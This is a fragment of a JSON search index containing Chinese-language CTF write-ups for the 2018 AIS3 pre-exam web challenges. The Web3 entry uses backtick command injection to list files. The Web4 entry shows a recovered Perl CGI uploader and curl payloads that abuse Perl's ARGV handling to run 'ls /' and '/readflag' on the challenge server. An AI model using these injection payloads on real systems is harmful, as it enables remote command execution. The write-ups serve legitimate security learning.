phpinfo.php \uff0c\u60f3\u8aaa\u6703\u5728\u5176\u4ed6\u76ee\u9304\uff0c\u4f46\u662f\u60f3\u8981\u627e\u5176\u4ed6\u76ee\u9304\u6307\u4ee4\u6703\u592a\u9577\uff0c\u6240\u4ee5\u53c8\u60f3\u4e86\u4e00\u4e0b\uff0c\u53ef\u4ee5\u628a exec \u63db\u6210\u5169\u500b\u53cd\u5f15\u865f\uff0c\u8b8a\u6210 \".\u2035ls\u2035.\" \uff0c\u7136\u5f8c\u5c31\u8dd1\u51fa\u5176\u4ed6\u6a94\u6848\uff0c\u88e1\u9762\u5c31\u6709flag\uff0c\u6a94\u6848\u662f flag_name_1s_t00_l0ng_QAQQQQQQ \uff0c\u6a94\u540d\u592a\u9577\uff0c\u4e0d\u80fd\u7528cat\uff0c\u90a3\u5c31\u76f4\u63a5\u628a\u6a94\u540d\u52a0\u5728\u7db2\u5740\u5f8c\u5c31\u80fd\u770b\u4e86 exec \u53ea\u770b\u5230 phpinfo.php \u7684\u539f\u56e0\u662f exec \u9810\u8a2d\u53ea\u6703\u7d66\u51fa\u6700\u5f8c\u4e00\u884c\u7684\u8f38\u51fa", 
            "title": "Web3"
        }, 
        {
            "location": "/CTFWriteUp/2018/AIS3/pre-exam/#web4", 
            "text": "perljam\n\u53c8\u662f\u85cf\u4e86.git\n\u7528Githack\u6293\u4e0b\u4f86\uff0c\u767c\u73fe\u4e00\u4efd\u6a94\u6848\nindex-b44be173b965d6bdc0b784b6797fac0a.cgi.bak  #!/usr/bin/perl  # My uploader!  use strict;  use warnings;  use CGI;  my $cgi = CGI- new;  print $cgi- header();  print  body style=\\ background: #caccf7 url( https://i.imgur.com/Syv2IVk.png );padding: 30px;\\ ;  print  p style= color:red No BUG Q_____Q /p ;  print  br ;  print  pre ;  if( $cgi- upload( file ) ) {          my $file = $cgi- param( file );          while( $file ) {                  print  $_ ;          }  }  print  /pre ;   \u4e0a\u7db2\u627e\u4e00\u627e\uff0c\u767c\u73fe\u4e86\nhttps://github.com/isislab/CSAW-CTF-2016-Quals/tree/master/Web/I%20Got%20Id\n\u628apayload\u6539\u4e00\u4e0b  echo \"asdf\" | curl -F \"file=ARGV\" -F \"file=@-\" \"http://104.19135:31334/cgi-bin/index.cgi?ls /|\" \n\u627e\u5230 readflag  echo \"asdf\" | curl -F \"file=ARGV\" -F \"file=@-\" \"http://104.19135:31334/cgi-bin/index.cgi?/readflag|\" \n\u57f7\u884c readflag \uff0cflag\u5c31\u5674\u51fa\u4f86\u4e86", 
            "title": "Web4"
        }
    ]
}